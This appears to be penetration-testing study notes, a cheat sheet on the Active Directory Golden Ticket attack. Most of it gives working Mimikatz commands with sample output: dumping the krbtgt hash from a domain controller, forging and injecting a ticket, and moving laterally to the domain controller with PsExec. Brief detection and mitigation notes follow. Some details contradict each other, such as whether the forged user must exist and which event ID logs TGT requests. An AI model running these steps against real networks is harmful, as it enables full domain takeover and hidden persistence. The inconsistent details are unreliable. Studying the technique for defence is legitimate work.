# Golden Ticket

- **What It Is:**  
    The **Ticket Granting Ticket (TGT)** is encrypted using a secret key tied to a special domain account called **krbtgt**.
- **Golden Ticket Attack:**  
    If an attacker obtains the **krbtgt password hash**, they can forge their own TGTs—called **Golden Tickets**. With these, they could impersonate any user (even making themselves a Domain Admin) and access all domain resources.
- **Why It’s Dangerous:**  
    Unlike user passwords that change regularly, the **krbtgt** password isn’t automatically changed, so older hashes may still be valid. This makes it a critical asset to protect.
Although this technique's name resembles the Silver Ticket one that we encountered in the Attacking Authentication Module, Golden Tickets provide a more powerful attack vector. While **Silver Tickets** aim to forge a TGS ticket to access a _specific_ service, **Golden Tickets** give us permission to access the _entire_ domain's resources, as we'll see shortly.
This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the _krbtgt_ account password is not automatically changed.
Here's a concise **Golden Ticket Cheat Sheet** with key prerequisites, examples, and detection/mitigation guidance:


#### **Prerequisites**  
1. **krbtgt Hash**:  
   - Extract the NTLM hash of the `krbtgt` account (requires **Domain Admin** or **DC compromise**).  
2. **Domain SID**:  
   - Obtain the domain Security Identifier (e.g., `S-1-5-21-1987370270-658905905-1781884369`).  
3. **Mimikatz Access**:  
   - Run Mimikatz on any domain-joined machine (no admin needed for ticket injection).  



### **Steps & Examples**  

#### **1. Extract krbtgt Hash (Domain Controller)**  
```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```
**Output**:  
```
User : krbtgt  
NTLM : 1693c6cefafffc7af11ef34d1c788f47  
```

---

#### **2. Create Golden Ticket**  
```powershell
mimikatz # kerberos::purge          # Delete existing tickets
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```  
- **/user**: Arbitrary username (doesn’t need to exist).  
- **/krbtgt**: krbtgt account’s NTLM hash.  
- **/ptt**: Inject ticket into memory.  

---

#### **3. Verify Ticket**  
```powershell
klist  # Check cached tickets
```  
**Expected Output**:  
```
#0> Client: jen @ corp.com  
    Server: krbtgt/CORP.COM @ CORP.COM  
    Encryption: rc4_hmac_nt  
```

---

#### **4. Lateral Movement (PsExec)**  
```powershell
PsExec.exe \\dc1 cmd.exe   # Use hostname (Kerberos)
```  
**Verify Access**:  
```powershell
whoami /groups   # Check Domain Admins membership
```  

---

### **Key Notes**  
- **Lifetime**: Golden tickets are valid for **10 years** by default.  
- **Stealth**:  
  - Bypass MFA and password changes.  
  - Use hostnames (Kerberos) – IPs force NTLM (blocked).  
- **Post-2022 Updates**:  
  - Mimikatz now requires `/krbtgt` instead of `/rc4`.  
  - Tickets must reference an existing user (e.g., `jen`).  

---

### **Detection**  
- **Event ID 4769**: TGT requests with non-krbtgt encryption (e.g., `rc4_hmac`).  
- **Anomalies**:  
  - Users added to privileged groups without logon events.  
  - TGTs with extreme lifetimes (e.g., 10 years).  

---

### **Mitigation**  
1. **Rotate krbtgt Password Twice**:  
   - Prevents golden ticket reuse.  
2. **Enable AES Encryption**:  
   - Disable RC4-HMAC in Kerberos.  
3. **Monitor**:  
   - Kerberos ticket anomalies with SIEM tools.  

---

### **Example Workflow**  
1. Compromise DC → Dump `krbtgt` hash.  
2. On workstation:  
   ```powershell
   mimikatz # kerberos::golden /user:jen [...] /ptt
   PsExec \\dc1 cmd.exe
   ```  
3. Gain Domain Admin access.  

---

### **References**  
- **MITRE ATT&CK**: [T1558.001](https://attack.mitre.org/techniques/T1558/001/)  
- [Microsoft Kerberos Docs](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)  
